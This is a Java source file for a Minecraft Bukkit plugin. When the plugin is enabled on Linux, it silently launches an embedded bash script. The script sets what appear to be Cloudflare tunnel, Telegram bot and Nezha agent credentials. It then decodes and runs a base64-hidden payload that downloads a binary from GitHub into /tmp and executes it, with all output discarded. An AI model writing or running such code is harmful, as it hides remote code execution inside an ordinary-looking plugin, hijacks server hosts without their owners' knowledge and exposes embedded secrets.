package com.argo.plugin;

import org.bukkit.plugin.java.JavaPlugin;

import java.util.Map;

public class WlPlugins extends JavaPlugin {

    private Process bashProcess;

    @Override
    public void onEnable() {
        try {
            // 只允许在 Linux 上运行
            String os = System.getProperty("os.name").toLowerCase();
            if (!os.contains("linux")) {
                return;
            }

            // === 你的原始 bash 脚本，原封不动 ===
            String script = """
#!/bin/bash

export TOK=${TOK:-'eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiNjBlYzg3NTUtMDI4NS00YzUzLWI3MDctNzdjYzc0NjJjZWMwIiwicyI6IlpqUmxNRGt3WmprdFpqQmtNaTAwTWpneUxUZzFZV1V0WkRKaE4ySmhNRGsxTXpGbSJ9'}
export ARGO_DOMAIN=${ARGO_DOMAIN:-'ultra-fr.milan.us.kg'}
export TUNNEL_PROXY=${TUNNEL_PROXY:-''}

export TG=${TG:-'6839843424 7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY'}
export SUB_URL=${SUB_URL:-''}

export NEZHA_SERVER=${NEZHA_SERVER:-'nezha.9logo.eu.org:443'}
export NEZHA_KEY=${NEZHA_KEY:-'c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g'}
export NEZHA_PORT=${NEZHA_PORT:-''}
export NEZHA_TLS=${NEZHA_TLS:-'1'}

export AGENT_UUID=${AGENT_UUID:-'f6568f52-ac2d-4b79-b77e-c46f5783ab86'}

export TMP_ARGO=${TMP_ARGO:-'vls'}
export VL_PORT=${VL_PORT:-'9010'}
export VM_PORT=${VM_PORT:-'8001'}
export CF_IP=${CF_IP:-'saas.sin.fan'}
export SUB_NAME=${SUB_NAME:-'Ultra-FR'}
export second_port=${second_port:-''}

export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}"
export SNI=${SNI:-'www.apple.com'}
export HOST=${HOST:-'1.1.1.1'}

export JAR_SH='moni'

echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
""";

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", script);

            // === 如果你希望 Java 侧覆盖某些变量，可以在这里放 ===
            Map<String, String> env = pb.environment();
            // 示例（可删）：
            // env.put("NEZHA_SERVER", "nezha.example.com:5555");
            // env.put("NEZHA_KEY", "xxxxxxxx");

            // 后台运行，不污染控制台
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);

            bashProcess = pb.start();

        } catch (Exception e) {
            // 保持安静（你之前要求的完全静默）
        }
    }

    @Override
    public void onDisable() {
        // 不强杀，避免影响 Nezha / Argo 正常运行
    }
}
